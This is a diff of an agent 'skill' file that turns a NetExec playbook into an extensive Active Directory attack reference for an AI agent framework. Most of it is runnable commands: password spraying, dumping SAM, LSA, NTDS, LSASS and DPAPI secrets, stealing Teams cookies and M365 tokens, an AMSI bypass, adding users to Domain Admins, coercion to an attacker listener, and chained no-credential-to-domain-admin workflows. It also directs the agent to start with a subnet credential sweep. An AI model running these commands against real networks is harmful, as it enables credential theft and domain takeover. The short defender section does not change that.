@@ -1,130 +1,748 @@
 ---
 name: netexec
-description: NetExec (CrackMapExec successor) — unified SMB/LDAP/MSSQL/WinRM/RDP/SSH/FTP/VNC protocol auth + post-auth modules. 200+ modules incl. BloodHound auto-ingest, ESC1-15 scanning, PrintNightmare, LDAP relay.
+description: "NetExec (nxc) — SMB/LDAP/WinRM/WMI/MSSQL/SSH/RDP/VNC/FTP/NFS protocol auth + post-auth modules. 200+ modules incl. BloodHound auto-ingest, ESC1-15 scan, PrintNightmare, ZeroLogon, coerce_plus, lsassy, nanodump, DPAPI, LAPS, SCCM, WAM, pre2k, raisechild. Full flag reference + 4 scenario workflows (no-creds → DA)."
 metadata:
+  subdomain: active-directory
   when_to_use: "netexec nxc cme crackmapexec smb ldap mssql winrm rdp ad spray sweep"
   mitre_attack: T1078, T1110, T1135, T1018, T1021
-  subdomain: active-directory
   upstream_url: https://github.com/Pennyw0rth/NetExec
 ---
 
-# NetExec (`nxc`) Playbook
+# NetExec (nxc) — Reference Skill
 
-**NetExec** is the actively-maintained fork of CrackMapExec (archived
-2023). One CLI, 8+ protocols, 200+ modules. The Swiss-army knife of
-Windows / AD pentest.
+**NetExec** is the actively-maintained fork of CrackMapExec (archived 2023). One CLI, 10 protocols, 200+ modules. The Swiss-army knife of Windows / AD pentest.
 
-## 1. Install
+## Install
+
 ```bash
 pipx install netexec      # preferred — isolates deps
 # Or:
 git clone https://github.com/Pennyw0rth/NetExec && cd NetExec && pipx install .
 ```
 
-## 2. Protocol auth sweep
-```bash
-# Test creds across a subnet — single SMB null bind sweep
-nxc smb 10.0.0.0/24
+## Global Syntax & Options
 
-# With creds
-nxc smb 10.0.0.0/24 -u alice -p Spring2024!
-nxc smb 10.0.0.0/24 -u alice -H aad3b435b51404ee...:31d6cfe0d16ae931...  # NTLM hash
-
-# Across protocols — same creds, different services
-nxc ldap   $DC -u alice -p $PW
-nxc mssql  10.0.0.5 -u alice -p $PW
-nxc winrm  10.0.0.5 -u alice -p $PW
-nxc rdp    10.0.0.5 -u alice -p $PW
-nxc ssh    10.0.0.5 -u alice -p $PW
-
-# Kerberos auth
-nxc smb $DC -u alice -p $PW -k --kdcHost $DC
+```
+nxc <protocol> <target(s)> [auth options] [action options] [global options]
 ```
 
-## 3. Critical modules
+### Available Protocols
+`smb` `ssh` `ldap` `ftp` `wmi` `winrm` `rdp` `vnc` `mssql` `nfs`
 
-### 3.1 BloodHound auto-collect (built-in)
+### Target Formats
 ```bash
-nxc ldap $DC -u alice -p $PW --bloodhound --collection All \
-  --dns-server $DC_IP
-# Drops Zip in current dir, ready to ingest into BloodHound
+nxc smb 192.168.1.0/24          # CIDR
+nxc smb 192.168.1.1 192.168.1.2 # Multiple IPs
+nxc smb 192.168.1.1-28          # IP range
+nxc smb dc01.corp.local         # Hostname
+nxc smb ~/targets.txt           # File
 ```
 
-### 3.2 ADCS ESC1-15 scan
+### Global Flags
+| Flag | Description |
+|------|-------------|
+| `-t THREADS` | Concurrent threads (default: 100) |
+| `--timeout TIMEOUT` | Per-thread timeout in seconds |
+| `--jitter INTERVAL` | Random delay between connections (e.g. `3`, `2-5`, `4-4`) |
+| `--no-progress` | Suppress progress bar |
+| `--verbose` | Verbose output |
+| `--debug` | Debug-level output |
+
+---
+
+## Authentication
+
+### Core Auth Flags
 ```bash
-nxc ldap $DC -u alice -p $PW -M adcs
-# Lists all certificates templates + vulnerability flags
+-u USERNAME          # Single username
+-u user1 user2       # Multiple usernames
+-u ~/users.txt       # Username file
+
+-p PASSWORD          # Plaintext password
+-p 'P@ss!'           # Always quote special chars
+-p='-P@ss'           # Use = for passwords starting with -
+
+-H 'NTHASH'          # NT hash only
+-H 'LM:NT'           # Full NTLM hash
+-H 'aad3b435b51404eeaad3b435b51404ee:NTHASH'
+
+-id <cred_id>        # Use credential from nxcdb
+
+--local-auth         # Authenticate as local user (not domain)
 ```
 
-### 3.3 Kerberoasting
+### Domain Auth (SMB example)
 ```bash
-nxc ldap $DC -u alice -p $PW --kerberoasting kerb.hashes
-hashcat -m 13100 kerb.hashes wordlist.txt
+nxc smb 192.168.1.0/24 -u Administrator -p 'Password123'
+nxc smb 192.168.1.0/24 -u Administrator -H 'aad3b435b51404eeaad3b435b51404ee:NTHASH'
 ```
 
-### 3.4 AS-REP roasting
+### Local Auth
 ```bash
-nxc ldap $DC -u alice -p $PW --asreproast asrep.hashes
-hashcat -m 18200 asrep.hashes wordlist.txt
+nxc smb 192.168.1.0/24 -u localadmin -p 'Password123' --local-auth
 ```
 
-### 3.5 Spider SMB shares
+### Kerberos Auth
 ```bash
-nxc smb 10.0.0.0/24 -u alice -p $PW \
-  --spider-plus --extensions txt,xml,config,ini,xls,xlsx,docx \
-  --output-folder /tmp/spider
+# Auto-handle TGT using password
+nxc smb dc01.corp.local -u user -p pass -k
+
+# Use existing ccache ticket
+export KRB5CCNAME=/path/to/ticket.ccache
+nxc smb dc01.corp.local --use-kcache
+
+# Specify KDC explicitly
+nxc ldap dc01.corp.local -u user -p pass -k --kdcHost dc01.corp.local
 ```
 
-### 3.6 DC sync (when authorized as DA)
+### Multi-Domain Environments
 ```bash
-nxc smb $DC -u administrator -p $PW --ntds drsuapi
-# Drops ntds.dit hashes to stdout/output
+# users.txt format:
+# DOMAIN1\user1
+# DOMAIN2\user2
+nxc smb <target> -u users.txt -p 'Password123'
 ```
 
-### 3.7 Password spray (with lockout protection)
+### Output Color Codes
+- **RED** — Authentication failed
+- **GREEN** — Authentication succeeded
+- **MAGENTA** — Password valid but account is not admin
+- **`(Pwn3d!)`** — Admin access / code execution available
+
+### Pwn3d! Meaning by Protocol
+| Protocol | Pwn3d! Meaning |
+|----------|---------------|
+| SMB | Local/domain admin access |
+| WMI | Local admin |
+| WinRM | Code execution |
+| RDP | Code execution |
+| VNC | Code execution |
+| LDAP | Path to Domain Admin |
+| SSH | Root access |
+| FTP | No check |
+
+---
+
+## Password Spraying & Brute Force
+
 ```bash
-nxc smb $DC --users users.txt -p 'Spring2024!' --threads 1 --jitter 30
-# Slow + jittered to evade lockout
+# Spray one password across many users
+nxc smb <target> -u ~/users.txt -p 'Summer2024!' --no-bruteforce --continue-on-success
+
+# Brute force (user × pass combinations)
+nxc smb <target> -u ~/users.txt -p ~/passwords.txt
+
+# Hash spraying
+nxc smb <target> -u ~/users.txt -H ~/hashes.txt --no-bruteforce
+
+# Throttle to avoid lockouts
+nxc smb <target> -u ~/users.txt -p 'Pass123' --jitter 3
+nxc smb <target> -u ~/users.txt -p 'Pass123' --jitter 2-5
+
+# IMPORTANT: --no-bruteforce pairs user[0]:pass[0], user[1]:pass[1], etc.
+# Without it: every user × every password (full bruteforce)
+
+# Keep going after first valid credential found
+nxc smb <target> -u ~/users.txt -p 'Password' --continue-on-success
 ```
 
-### 3.8 Module catalog
+> ⚠️ **OpSec**: Jitter works per-host. Spraying against multiple hosts
+> multiplies authentication attempts. Monitor domain lockout policy before
+> spraying (use `--pass-pol` first).
+
+---
+
+## SMB Protocol
+
+### Network Discovery
 ```bash
-nxc smb -L                          # all SMB modules
-nxc ldap -L                         # all LDAP modules
-nxc smb -M lsassy -o ...            # use lsassy module to dump LSASS
-nxc smb -M wcc                      # Windows Configuration Collector
-nxc smb -M printnightmare           # PrintNightmare CVE-2021-34527
-nxc smb -M zerologon                # ZeroLogon CVE-2020-1472
-nxc smb -M scuffy                   # scf file for credential coercion
+# Map live hosts — get OS, hostname, domain, signing, SMBv1
+nxc smb 192.168.1.0/24
+
+# Expected output:
+# SMB  192.168.1.101  445  DC2016A  [*] Windows Server 2016 x64 (name:DC2016A) (domain:CORP) (signing:True) (SMBv1:False)
 ```
 
-## 4. Output formats
+### Enumeration
 ```bash
-nxc smb $TARGET -u alice -p $PW --log /tmp/nxc.log
-nxc smb $TARGET -u alice -p $PW --json /tmp/nxc.json
-nxc smb $TARGET -u alice -p $PW --csv  /tmp/nxc.csv
+# Shares and access
+nxc smb <ip> -u user -p pass --shares
+
+# Null session share enum
+nxc smb <ip> -u '' -p '' --shares
+
+# Guest logon check
+nxc smb <ip> -u 'a' -p ''
+nxc smb <ip> -u 'a' -p '' --shares
+
+# Domain users
+nxc smb <ip> -u user -p pass --users
+nxc smb <ip> -u user -p pass --users-export output.txt
+
+# Enumerate users by bruteforcing RIDs (no domain creds needed)
+nxc smb <ip> -u '' -p '' --rid-brute
+nxc smb <ip> -u '' -p '' --rid-brute 10000   # Set max RID
+
+# Password policy (check before spraying!)
+nxc smb <ip> -u user -p pass --pass-pol
+
+# Logged-on users (requires admin)
+nxc smb 192.168.1.0/24 -u user -p pass --loggedon-users
+nxc smb 192.168.1.0/24 -u user -p pass --loggedon-users targetuser
+
+# Active Windows sessions (registry-based, no admin needed)
+nxc smb <target>/24 -u user -p pass --reg-sessions
+nxc smb <target>/24 -u user -p pass --reg-sessions 'admin_user'
+nxc smb <target>/24 -u user -p pass --reg-sessions './users.txt'
+
+# Active sessions via QWINSTA (admin required)
+nxc smb 192.168.1.0/24 -u user -p pass --qwinsta
+nxc smb 192.168.1.0/24 -u user -p pass --qwinsta targetuser
+
+# Local groups
+nxc smb 192.168.1.0/24 -u user -p pass --local-group
+
+# Disks
+nxc smb 192.168.1.0/24 -u user -p pass --disks
+
+# Network interfaces (admin required)
+nxc smb <ip> -u user -p pass --interfaces
+
+# Null sessions
+nxc smb <ip> -u '' -p ''
+
+# SMB signing not required (relay attack candidates)
+nxc smb 192.168.1.0/24 --gen-relay-list relay_targets.txt
+
+# Check for NTLMv1 (via remote registry, admin required)
+nxc smb <ip> -u user -p pass -M ntlmv1
+
+# Enumerate AV/EDR (no admin needed)
+nxc smb <ip> -u user -p pass -M enum_av
+
+# Enumerate BitLocker status
+nxc smb <ip> -u user -p pass -M bitlocker
+
+# Enumerate remote processes (admin required)
+nxc smb <ip> -u user -p pass --remote-processes
+
+# Check for lockscreen backdoors (admin required)
+nxc smb <ip> -u Administrator -p 'PASSWORD' -M lockscreendoors
 ```
 
-NetExec also writes to `~/.nxc/` SQLite DB by default — query w/
-`nxcdb`:
+### Spidering Shares
 ```bash
-nxcdb
-nxc > workspace default
-nxc default > proto smb
-nxc default (smb) > hosts
-nxc default (smb) > creds
+# Spider specific share for file pattern
+nxc smb <ip> -u user -p pass --spider C\$ --pattern txt
+
+# Spider all readable shares (list only)
+nxc smb <ip> -u user -p pass -M spider_plus
+
+# Spider and download all files
+nxc smb <ip> -u user -p pass -M spider_plus -o DOWNLOAD_FLAG=True
+
+# Filter by content/regex
+nxc smb <ip> -u user -p pass -M spider_plus -o PATTERN='password'
 ```
 
-## 5. Raptix integration
+### File Operations
+```bash
+# Get a file
+nxc smb <ip> -u user -p pass --get-file /remote/path/file.txt /local/path/file.txt
 
-When agent has any valid AD cred (recon or roast), the **first move
-should be `nxc smb` cred-sweep across the subnet**. It surfaces:
+# Put a file
+nxc smb <ip> -u user -p pass --put-file /local/file.txt /remote/path/file.txt
+```
+
+### Command Execution
+Requires admin/Pwn3d! access.
+
+```bash
+# Execute cmd command (-x)
+nxc smb <ip> -u Administrator -p 'Pass' -x whoami
+
+# Execute PowerShell command (-X)
+nxc smb <ip> -u Administrator -p 'Pass' -X '$PSVersionTable'
+
+# Force specific execution method
+nxc smb <ip> -u user -p pass -x whoami --exec-method wmiexec
+nxc smb <ip> -u user -p pass -x whoami --exec-method atexec
+nxc smb <ip> -u user -p pass -x whoami --exec-method smbexec
+
+# Bypass AMSI for PowerShell
+nxc smb <ip> -u user -p pass -X 'Get-Process' --amsi-bypass /path/to/payload
+
+# Process Injection — run as another user's process (SYSTEM needed)
+nxc smb <ip> -u user -p pass -M pi -o PID=<target_pid> EXEC=whoami
+```
+
+**Execution method order (automatic fallback):** wmiexec → atexec → smbexec
+
+### Credential Dumping via SMB
+All methods below require local admin unless noted.
+
+```bash
+# SAM hashes (local accounts)
+nxc smb 192.168.1.0/24 -u Administrator -p 'Pass' --sam
+nxc smb 192.168.1.0/24 -u Administrator -p 'Pass' --sam secdump  # fallback method
+
+# LSA secrets (requires Domain Admin or Local Admin on DC)
+nxc smb 192.168.1.0/24 -u Administrator -p 'Pass' --lsa
+nxc smb 192.168.1.0/24 -u Administrator -p 'Pass' --lsa secdump
+
+# NTDS.dit — full AD hash dump (requires Domain Admin)
+nxc smb 192.168.1.100 -u DomainAdmin -p 'Pass' --ntds
+nxc smb 192.168.1.100 -u DomainAdmin -p 'Pass' --ntds --enabled   # active accounts only
+nxc smb 192.168.1.100 -u DomainAdmin -p 'Pass' --ntds vss         # VSS method
+nxc smb 192.168.1.100 -u DomainAdmin -p 'Pass' --ntds --user Administrator
+nxc smb 192.168.1.100 -u DomainAdmin -p 'Pass' --ntds --user NETBIOS/Administrator  # multi-domain
+
+# NTDS via ntdsutil module
+nxc smb 192.168.1.100 -u DomainAdmin -p 'Pass' -M ntdsutil
+
+# NTDS via raw disk access
+nxc smb 192.168.1.100 -u DomainAdmin -p 'Pass' -M ntds-dump-raw -o TARGET=NTDS
+
+# LSASS dump
+nxc smb <ip> -u Administrator -p 'Pass' -M lsassy
+nxc smb <ip> -u Administrator -p 'Pass' -M nanodump
+nxc smb <ip> -u Administrator -p 'Pass' -M mimikatz  # deprecated
+
+# DPAPI — browser creds, Credential Manager
+nxc smb <ip> -u user -p pass --dpapi
+nxc smb <ip> -u user -p pass --dpapi cookies       # include browser cookies
+nxc smb <ip> -u user -p pass --dpapi nosystem      # skip system creds (stealth)
+nxc smb <ip> -u user -p pass --local-auth --dpapi nosystem
+
+# Azure/M365 token cache (WAM)
+nxc smb <ip> -u user -p pass -M wam
+nxc smb <ip> -u user -p pass -M wam --mkfile masterkeys.txt
+nxc smb <ip> -u user -p pass -M wam --pvk domain_backup_key.pvk
+
+# BackupOperator privilege abuse (no local admin needed if SeBackupPrivilege)
+nxc smb <ip> -u user -p pass -M backup_operator
+
+# SCCM credentials
+nxc smb <ip> -u user -p pass --sccm
+nxc smb <ip> -u user -p pass --sccm disk
+nxc smb <ip> -u user -p pass --sccm wmi
+
+# Credential manager applications
+nxc smb <ip> -u user -p pass -M keepass_discover
+nxc smb <ip> -u user -p pass -M keepass_trigger -o KEEPASS_CONFIG_PATH="/path/from/discovery"
+nxc smb <ip> -u user -p pass -M veeam
+nxc smb <ip> -u user -p pass -M wifi
+nxc smb <ip> -u user -p pass -M winscp
+nxc smb <ip> -u user -p pass -M vnc
+nxc smb <ip> -u user -p pass -M mremoteng
+nxc smb <ip> -u user -p pass -M rdcman
+nxc smb <ip> -u user -p pass -M putty
+
+# Notepad / Notepad++ unsaved documents
+nxc smb <ip> -u user -p pass -M notepad
+nxc smb <ip> -u user -p pass -M notepad++
+```
+
+### Vulnerability Scanning
+```bash
+# ZeroLogon (CVE-2020-1472)
+nxc smb <ip> -u '' -p '' -M zerologon
+
+# noPAC / Sam-The-Admin (needs creds)
+nxc smb <ip> -u user -p pass -M nopac
+
+# PrintNightmare
+nxc smb <ip> -u '' -p '' -M printnightmare
+
+# SMBGhost (CVE-2020-0796)
+nxc smb <ip> -u '' -p '' -M smbghost
+
+# EternalBlue MS17-010
+nxc smb <ip> -u '' -p '' -M ms17-010
+
+# NTLM Reflection (CVE-2025-33073) — needs creds
+nxc smb <ip> -u user -p pass -M ntlm_reflection
+
+# Coercion vulns (PetitPotam, DFSCoerce, PrinterBug, MSEven, ShadowCoerce)
+nxc smb <ip> -u '' -p '' -M coerce_plus
+nxc smb <ip> -u '' -p '' -M coerce_plus -o LISTENER=<AttackerIP>
+nxc smb <ip> -u '' -p '' -M coerce_plus -o LISTENER=<AttackerIP> ALWAYS=true
+nxc smb <ip> -u '' -p '' -M coerce_plus -o METHOD=PetitPotam   # or pe, dfs, pr
+
+# Run multiple vuln checks at once
+nxc smb <ip> -u '' -p '' -M zerologon -M printnightmare -M smbghost
+```
+
+### LAPS
+```bash
+# Read LAPS password (if you have a user with ReadLAPSPassword rights)
+nxc smb <ip> -u laps-reader -p pass --laps
+nxc smb <ip> -u laps-reader -p pass --laps customadminname  # non-default admin name
+```
+
+### Delegation Abuse
+```bash
+# RBCD — impersonate any user if msDS-AllowedToActOnBehalfOfOtherIdentity is set
+nxc smb <ip> -u jon.snow -p iknownothing --delegate Administrator
+
+# S4U2Self — with computer account nearly always gets local admin
+nxc smb <ip> -u 'COMPUTER$' -H <nthash> --delegate Administrator --self
+```
+
+### Miscellaneous SMB
+```bash
+# Impersonate logged-on users
+nxc smb <ip> -u user -p pass -M schtask_as -o USER=targetuser CMD=whoami
+
+# Change user password
+nxc smb <ip> -u user -p pass --change-password newpassword
+
+# Modify group membership
+nxc smb <ip> -u admin -p pass --modify-group "Domain Admins" --add-user victimuser
+
+# Dump Teams cookies
+nxc smb <ip> -u user -p pass -M teams_localdb
+
+# Steal Teams cookies
+nxc smb <ip> -u user -p pass -M steal_teams_cookies
+
+# Check spooler / WebDAV running
+nxc smb <ip> -u user -p pass -M spooler
+nxc smb <ip> -u user -p pass -M webdav
+
+# Defeating LAPS — read password if privileged
+nxc smb <ip> -u privilegeduser -p pass --laps
+```
+
+---
+
+## LDAP Protocol
+
+### Authentication / Basic
+```bash
+nxc ldap <ip> -u user -p pass
+nxc ldap <ip> -u user -p pass -k                        # Kerberos
+nxc ldap <ip> -u user -p pass -k --kdcHost dc01.corp.local
+```
+
+### User Enumeration
+```bash
+nxc ldap <ip> -u user -p pass --users
+nxc ldap <ip> -u user -p pass --users-export output.txt
+nxc ldap <ip> -u user -p pass --active-users            # Active (non-disabled) users only
+nxc ldap <ip> -u user -p pass --get-user-descriptions   # Users with descriptions
+nxc ldap <ip> -u user -p pass --admin-count            # Users with adminCount=1
+```
+
+### Group Enumeration
+```bash
+nxc ldap <ip> -u user -p pass --groups
+nxc ldap <ip> -u user -p pass --group-members "Domain Admins"
+```
+
+### Domain Info
+```bash
+nxc ldap <ip> -u user -p pass --dc-list          # Domain Controllers
+nxc ldap <ip> -u user -p pass --find-domain-sid  # Domain SID
+nxc ldap <ip> -u user -p pass --trusts           # Domain trusts
+nxc ldap <ip> -u user -p pass --machine-account-quota  # MAQ value
+nxc ldap <ip> -u user -p pass --get-scriptpath   # GPO script paths
+nxc ldap <ip> -u user -p pass --extract-subnet   # Subnets from AD Sites
+nxc ldap <ip> -u user -p pass --check-ldap-signing  # LDAP signing config
+```
+
+### Kerberos Attacks
+```bash
+# ASREPRoast — no auth needed if you have usernames
+nxc ldap <ip> -u '' -p '' --asreproast output.txt       # anonymous (if allowed)
+nxc ldap <ip> -u users.txt -p '' --asreproast output.txt
+nxc ldap <ip> -u user -p pass --asreproast output.txt   # authenticated (finds all)
+nxc ldap <ip> -u user -p pass --asreproast output.txt --kdcHost dc01.corp.local
+
+# Crack with hashcat
+hashcat -m18200 output.txt wordlist.txt
+
+# Kerberoasting
+nxc ldap <ip> -u user -p pass --kerberoasting output.txt
+
+# Targeted Kerberoasting (requires WriteProperty on servicePrincipalName)
+nxc ldap <ip> -u user -p pass --kerberoasting output.txt --targeted-kerberoast victim1
+nxc ldap <ip> -u user -p pass --kerberoasting output.txt --targeted-kerberoast users.list
+
+# Kerberoasting via AS-REP roastable account
+nxc ldap <ip> -u asrep_user -p '' --no-preauth-targets kerberoastable.list --kerberoasting out.txt
+
+# Crack with hashcat
+hashcat -m13100 output.txt wordlist.txt
+
+# Pre2k Computer Account Abuse
+nxc ldap <ip> -u user -p pass -M pre2k
+# Tickets saved to ~/.nxc/modules/pre2k/ccache/
+```
+
+### Privilege Escalation & Delegation
+```bash
+# Find all misconfigured delegations (Unconstrained, Constrained, RBCD)
+nxc ldap <ip> -u user -p pass --find-delegation
+
+# Unconstrained delegation accounts
+nxc ldap <ip> -u user -p pass --unconstrained-delegation
+```
+
+### ACL / DACL Analysis
+```bash
+# Read all ACEs on a target object
+nxc ldap dc.lab.local -k --kdcHost dc.lab.local -M daclread -o TARGET=Administrator ACTION=read
+
+# Check what rights a specific principal has on a target
+nxc ldap dc.lab.local -k -M daclread -o TARGET=Administrator ACTION=read PRINCIPAL=BlWasp
+
+# Find who has DCSync rights
+nxc ldap dc.lab.local -k -M daclread -o TARGET_DN="DC=lab,DC=LOCAL" ACTION=read RIGHTS=DCSync
+
+# Check for DENY ACEs
+nxc ldap dc.lab.local -k -M daclread -o TARGET=Administrator ACTION=read ACE_TYPE=denied
+
+# Backup DACLs for multiple targets
+nxc ldap dc.lab.local -k -M daclread -o TARGET=../../targets.txt ACTION=backup
+```
+
+### Credential & Secret Extraction
+```bash
+# Dump gMSA passwords (requires right; uses LDAPS automatically)
+nxc ldap <ip> -u user -p pass --gmsa
+
+# Extract gMSA secrets
+nxc ldap <ip> -u user -p pass -M get-gmsa-creds
+
+# Read DACL rights on gMSA
+nxc ldap <ip> -u user -p pass --gmsa-convert-id <ID>
+```
+
+### BloodHound Data Collection
+```bash
+nxc ldap <ip> -u user -p pass --bloodhound --collection All
+nxc ldap <ip> -u user -p pass --bloodhound --collection DCOnly
+nxc ldap <ip> -u user -p pass --bloodhound --collection Session,LoggedOn
+```
+
+### SCCM / Entra ID / DNS
+```bash
+# SCCM enumeration
+nxc ldap <ip> -u user -p pass -M enum-sccm
+
+# Entra ID enumeration
+nxc ldap <ip> -u user -p pass --entra-id
+
+# Unsecured DNS zones
+nxc ldap <ip> -u user -p pass --enumerate-unsecure-dns-zones
+
+# Custom LDAP query
+nxc ldap <ip> -u user -p pass --query "(objectClass=user)" "sAMAccountName"
+```
+
+### raisechild — Domain Trust Escalation
+```bash
+nxc ldap <ip> -u user -p pass -M raisechild
+```
+
+---
+
+## WinRM Protocol
+
+```bash
+# Check auth
+nxc winrm <ip> -u user -p pass
+
+# Execute command
+nxc winrm <ip> -u user -p pass -X whoami
+
+# Credential dumping (admin required)
+nxc winrm <ip> -u user -p pass --sam
+nxc winrm <ip> -u user -p pass --lsa
+nxc winrm <ip> -u user -p pass --dpapi   # no admin needed — dumps current user creds
+```
+
+> **Pwn3d!** on WinRM = code execution is possible. Use `evil-winrm` for
+> interactive shell: `evil-winrm -i <ip> -u user -p pass`
+
+---
+
+## WMI Protocol
+
+```bash
+# Auth check
+nxc wmi <ip> -u user -p pass
+
+# Password spray
+nxc wmi <ip> -u ~/users.txt -p ~/passwords.txt
+
+# Execute command
+nxc wmi <ip> -u user -p pass -x whoami
+```
+
+---
+
+## MSSQL Protocol
+
+```bash
+# Auth check (domain)
+nxc mssql <ip> -u user -p pass
+
+# Auth check (local SQL account)
+nxc mssql <ip> -u sa -p 'P@ssw0rd' --local-auth
+
+# Run SQL query
+nxc mssql <ip> -u admin -p pass --local-auth -q 'SELECT name FROM master.dbo.sysdatabases;'
+
+# OS command via xp_cmdshell (requires sysadmin)
+nxc mssql <ip> -u sa -p pass -x whoami
+
+# Password spray
+nxc mssql <ip> -u ~/users.txt -p ~/passwords.txt --no-bruteforce
+
+# Privilege escalation — check for impersonation rights
+nxc mssql <ip> -u user -p pass -M mssql_priv
+
+# Escalate to sysadmin
+nxc mssql <ip> -u user -p pass -M mssql_priv -o ACTION=privesc
+
+# Rollback (after engagement)
+nxc mssql <ip> -u user -p pass -M mssql_priv -o ACTION=rollback
+
+# Enumerate users by RID brute
+nxc mssql <ip> -u user -p pass --rid-brute
+
+# Linked servers
+nxc mssql <ip> -u user -p pass --mssql-linked-servers
+
+# Upload/download files
+nxc mssql <ip> -u user -p pass --put-file /local/file.txt C:\\remote\\file.txt
+nxc mssql <ip> -u user -p pass --get-file C:\\remote\\file.txt /local/file.txt
+```
+
+---
+
+## SSH Protocol
+
+```bash
+# Auth check
+nxc ssh <ip> -u user -p pass
+nxc ssh <ip> -u root -p pass         # Pwn3d! if root
+
+# Password spray
+nxc ssh 10.10.10.0/24 -u ~/users.txt -p ~/passwords.txt
+
+# Execute command
+nxc ssh <ip> -u user -p pass -x whoami
+
+# File transfer
+nxc ssh <ip> -u user -p pass --get-file /remote/file /local/file
+nxc ssh <ip> -u user -p pass --put-file /local/file /remote/path/file
+```
+
+---
+
+## RDP Protocol
+
+```bash
+# Auth check / password spray
+nxc rdp <ip> -u user -p pass
+nxc rdp 192.168.1.0/24 -u ~/users.txt -p ~/passwords.txt
+
+# Screenshot without NLA (unauthenticated)
+nxc rdp <ip> -u '' -p '' --screenshot --screentime 5
+
+# Screenshot with auth
+nxc rdp <ip> -u user -p pass --screenshot
+
+# Execute command
+nxc rdp <ip> -u user -p pass -x whoami
+```
+
+---
+
+## VNC Protocol
+
+```bash
+# Auth check
+nxc vnc <ip> -u user -p pass
+
+# Screenshot
+nxc vnc <ip> --screenshot
+```
+
+---
+
+## FTP Protocol
+
+```bash
+# Auth check / spray
+nxc ftp <ip> -u user -p pass
+nxc ftp <ip> -u ~/users.txt -p ~/passwords.txt
+
+# List files
+nxc ftp <ip> -u user -p pass --ls
+
+# Download / upload
+nxc ftp <ip> -u user -p pass --get-file /remote/file.txt /local/file.txt
+nxc ftp <ip> -u user -p pass --put-file /local/file.txt /remote/file.txt
+```
+
+---
+
+## NFS Protocol
+
+```bash
+# Enumerate exports
+nxc nfs <ip>
+nxc nfs <ip> -u user -p pass --enum-shares
+
+# Download / upload
+nxc nfs <ip> --get-file /remote/path/file.txt /local/file.txt
+nxc nfs <ip> --put-file /local/file.txt /remote/path/
+
+# chmod on remote file
+nxc nfs <ip> -u user -p pass --chmod 777 /remote/file.txt
+
+# Escape to root filesystem
+nxc nfs <ip> -u user -p pass --chroot
+```
+
+---
+
+## Modules System
+
+```bash
+# List all modules for a protocol
+nxc smb -L
+nxc ldap -L
+nxc winrm -L
+
+# View module options
+nxc smb -M lsassy --options
+
+# Run a module
+nxc smb <ip> -u user -p pass -M lsassy
+
+# Run with options
+nxc smb <ip> -u user -p pass -M spider_plus -o DOWNLOAD_FLAG=True
+
+# Run MULTIPLE modules at once (v1.1+)
+nxc smb <ip> -u user -p pass -M spooler -M iis -M lsassy -M winscp
+```
+
+## Raptix integration
+
+When agent has any valid AD cred (recon or roast), the **first move should be `nxc smb` cred-sweep across the subnet**. It surfaces:
+
 - Local admin reuse (massively common; instant lateral)
 - SMB signing disabled (relay target)
 - Shares accessible (PII / cred farming)
 - OS version + domain membership
 
 Wrap as Raptix tool:
+
 ```python
 # raptix/tools/ad/netexec.py — skeleton
 from raptix.tools.bash import bash_tool
@@ -146,32 +764,158 @@ def nxc_sweep(protocol: str, targets: str, user: str, pw_or_hash: str, modules: 
     return {"error": "no json output"}
 ```
 
-## 6. PoC framing
+---
+
+## Logging & Audit Mode
+
 ```bash
-# Confirm sweep — find local-admin reuse
-nxc smb 10.0.0.0/24 -u alice -p $PW --local-auth | grep '(Pwn3d!)'
-# Each (Pwn3d!) = local admin = lateral pivot target
+# Log all results to file
+nxc smb <target> -u user -p pass --log results.txt
+
+# Audit mode — redact creds from console (configure in ~/.nxc/nxc.conf)
+# Set: audit_mode = *   (or any character to use as redaction mask)
 ```
 
-## 7. Severity
+## Severity
+
 - (Pwn3d!) on production host: Critical 9.8 (RCE-ready)
 - SMB signing disabled in production: High 7-8 (relay attack possible)
 - Shares world-readable w/ PII: Critical depending on data
 
-## 8. Defender
+## Defender
+
 - Enforce SMB signing required (GPO: Computer Config → Windows Settings → Security Settings → Local Policies → Security Options → "Microsoft network server: Digitally sign communications (always)")
 - Disable NTLM authentication where Kerberos available
 - LAPS for local admin password rotation (kills local-admin-reuse)
 - Lockout policy w/ low threshold + long duration
 
-## Cross-references
-- Upstream: https://github.com/Pennyw0rth/NetExec
-- Raptix AD overview: `skills/ad/SKILL.md`
-- BloodHound: `skills/ad/bloodhound-query/SKILL.md`
-- Kerberoast: `skills/ad/kerberoasting/SKILL.md`
-- ADCS ESC1-15: `skills/ad/adcs-esc1/SKILL.md`
+## Pentest Scenario Example (Chained Workflows)
 
-## Known exemplars
+### Initial Recon (No Creds)
+```bash
+# 1. Discover live hosts and SMB info
+nxc smb 192.168.1.0/24
+
+# 2. Find hosts without SMB signing (relay targets)
+nxc smb 192.168.1.0/24 --gen-relay-list relay.txt
+
+# 3. Check null session / guest logon
+nxc smb 192.168.1.0/24 -u '' -p ''
+nxc smb 192.168.1.0/24 -u 'a' -p ''
+
+# 4. Enumerate shares with null session
+nxc smb 192.168.1.0/24 -u '' -p '' --shares
+
+# 5. ASREPRoast with username wordlist
+nxc ldap <dc_ip> -u users.txt -p '' --asreproast asrep.txt
+hashcat -m18200 asrep.txt /usr/share/wordlists/rockyou.txt
+```
+
+### With Domain Creds (Low Privilege)
+```bash
+# 1. Collect BloodHound data
+nxc ldap <dc_ip> -u user -p pass --bloodhound --collection All
+
+# 2. Get password policy
+nxc smb <dc_ip> -u user -p pass --pass-pol
+
+# 3. Enumerate all users
+nxc ldap <dc_ip> -u user -p pass --users-export users.txt
+
+# 4. Kerberoast
+nxc ldap <dc_ip> -u user -p pass --kerberoasting kerberoast.txt
+hashcat -m13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
+
+# 5. Find delegation misconfigs
+nxc ldap <dc_ip> -u user -p pass --find-delegation
+
+# 6. Check DACL rights on Domain Admins
+nxc ldap <dc_ip> -k -M daclread -o TARGET="Domain Admins" ACTION=read
+
+# 7. Scan for vulns
+nxc smb 192.168.1.0/24 -u user -p pass -M zerologon -M nopac -M coerce_plus
+```
+
+### With Local Admin (Lateral Movement)
+```bash
+# 1. Dump SAM / LSA on target
+nxc smb <ip> -u localadmin -p pass --local-auth --sam
+nxc smb <ip> -u localadmin -p pass --local-auth --lsa
+
+# 2. Dump LSASS (get domain creds)
+nxc smb <ip> -u localadmin -p pass --local-auth -M lsassy
+
+# 3. Spray dumped hashes across subnet
+nxc smb 192.168.1.0/24 -u Administrator -H <NTHASH> --local-auth
+
+# 4. Spider shares for sensitive files
+nxc smb 192.168.1.0/24 -u user -p pass -M spider_plus
+```
+
